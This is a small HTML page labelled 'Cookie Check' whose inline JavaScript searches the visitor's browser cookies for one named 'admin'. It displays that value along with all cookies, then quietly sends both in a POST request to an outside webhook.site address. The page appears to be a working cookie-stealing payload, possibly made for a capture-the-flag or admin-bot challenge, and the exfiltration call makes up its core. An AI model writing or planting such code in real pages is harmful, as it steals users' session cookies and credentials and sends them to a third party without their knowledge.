<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Cookie Check</title>
</head>
<body>
  <h1>Cookie Information</h1>
  <div id="result"></div>

<script>
function getAdminCookie() {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'admin') {
      return decodeURIComponent(value);
    }
  }
  return null;
}

const adminValue = getAdminCookie();
const resultDiv = document.getElementById('result');

if (adminValue) {
  resultDiv.innerHTML = `
    <h2 style="color: green;">✅ Admin Cookie Found!</h2>
    <p><strong>Value:</strong> ${adminValue}</p>
    <p><strong>All Cookies:</strong> ${document.cookie}</p>
  `;
  
  // Send to webhook
  fetch('https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({admin: adminValue, allCookies: document.cookie})
  });
} else {
  resultDiv.innerHTML = '<h2 style="color: red;">❌ No Admin Cookie Found</h2>';
}
</script>
</body>
</html>
